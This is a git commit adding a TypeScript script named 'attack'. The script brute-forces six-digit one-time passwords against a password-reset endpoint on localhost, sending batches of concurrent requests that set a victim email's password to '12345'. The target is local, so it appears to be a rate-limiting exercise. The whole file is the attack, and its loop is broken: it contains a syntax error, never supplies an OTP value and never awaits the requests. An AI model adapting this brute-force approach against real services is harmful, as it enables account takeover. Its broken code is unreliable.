9f415963179d0bb16a1a6a47a7e9c95a8fae36b7
*pknowledge* <mishrasangeeta944@gmail.com>
2024-05-08 18:41:33 +0530

    first commit

---
+++ attack/src/index.ts
@@ -0,0 +1,35 @@
+import axios from 'axios';
+
+async function sendRequest(otp: string) {
+    let data = JSON.stringify({
+        "email": "var89@gmail.com",
+        "otp": otp,
+        "newPassword": "12345"
+    });
+
+    let config = {
+        method: 'post',
+        maxBodyLength: Infinity,
+        url: 'http://localhost:3000/reset-password',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        data: data
+    };
+
+    try {
+        const response = await axios.request(config);
+        console.log(JSON.stringify(response.data));
+    } catch (error) {
+        console.log(error);
+    }
+}
+
+// sendRequest("264291");
+for(let i = 0; i< 99999;i+=100){
+    const p = []
+    // promise
+    for ( let j = 0; j<100;j++){
+        p.push(sendRequest(()))
+    }
+}
